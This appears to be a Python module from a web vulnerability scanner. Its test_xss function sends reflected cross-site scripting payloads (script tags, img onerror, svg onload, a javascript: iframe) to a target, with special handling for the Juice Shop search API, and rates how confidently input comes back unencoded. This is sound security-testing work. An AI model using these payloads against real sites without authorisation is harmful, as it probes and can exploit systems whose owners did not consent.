from utils.rate_limiter import rate_limited_request

# Different XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",           # Basic script tag
    "<img src=x onerror=alert('xss')>",        # Event handler
    "<svg onload=alert('xss')>",               # SVG event
]

def test_xss(session, url, param, base_url=None):
    """
    Test for XSS vulnerability.
    Supports Juice Shop REST API XSS detection.
    
    Returns:
        dict with: vulnerable (bool), confidence (HIGH/MEDIUM/LOW), evidence (str)
    """
    
    # Juice Shop REST API XSS (DOM-based detection limited)
    if base_url and "juiceshop" in base_url.lower():
        payload = "<iframe src=\"javascript:alert('xss')\">"
        search_url = base_url + "/rest/products/search"
        response = rate_limited_request(session, "GET", search_url, params={"q": payload})
        
        if response and (payload in response.text or "<iframe" in response.text):
            return {
                "vulnerable": True,
                "confidence": "HIGH",
                "evidence": "XSS payload reflected in REST API response",
                "payload": payload
            }
        
        # Check for unencoded tags
        test_payload = "<test>"
        response2 = rate_limited_request(session, "GET", search_url, params={"q": test_payload})
        if response2 and test_payload in response2.text:
            return {
                "vulnerable": True,
                "confidence": "MEDIUM",
                "evidence": "HTML tags reflected without encoding in REST API",
                "payload": test_payload
            }
    
    # Test with basic payload first
    basic_payload = "<script>alert('xss')</script>"
    response = rate_limited_request(session, "GET", url, params={param: basic_payload, "Submit": "Submit"})
    
    if response is None:
        return {"vulnerable": False, "confidence": "NONE", "evidence": "Request failed"}
    
    # HIGH confidence: Full script tag reflected unchanged
    if basic_payload in response.text:
        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "evidence": "Script tag reflected unchanged in response",
            "payload": basic_payload
        }
    
    # Check if < and > are reflected (might be encoded)
    test_chars = "<test123>"
    response2 = rate_limited_request(session, "GET", url, params={param: test_chars, "Submit": "Submit"})
    
    if response2 and test_chars in response2.text:
        # Tags are reflected but maybe script is filtered
        # Try alternative payload
        alt_payload = "<img src=x onerror=alert('xss')>"
        response3 = rate_limited_request(session, "GET", url, params={param: alt_payload, "Submit": "Submit"})
        
        if response3 and alt_payload in response3.text:
            return {
                "vulnerable": True,
                "confidence": "HIGH",
                "evidence": "Event handler payload reflected unchanged",
                "payload": alt_payload
            }
        
        # Tags reflected but scripts filtered
        return {
            "vulnerable": True,
            "confidence": "MEDIUM",
            "evidence": "HTML tags reflected (script tags may be filtered)",
            "payload": test_chars
        }
    
    # Check if input is reflected at all (LOW confidence)
    simple_test = "xsstest12345"
    response4 = rate_limited_request(session, "GET", url, params={param: simple_test, "Submit": "Submit"})
    
    if response4 and simple_test in response4.text:
        return {
            "vulnerable": True,
            "confidence": "LOW",
            "evidence": "Input reflected but HTML encoded - may need bypass",
            "payload": simple_test
        }
    
    return {"vulnerable": False, "confidence": "NONE", "evidence": "Input not reflected in response"}
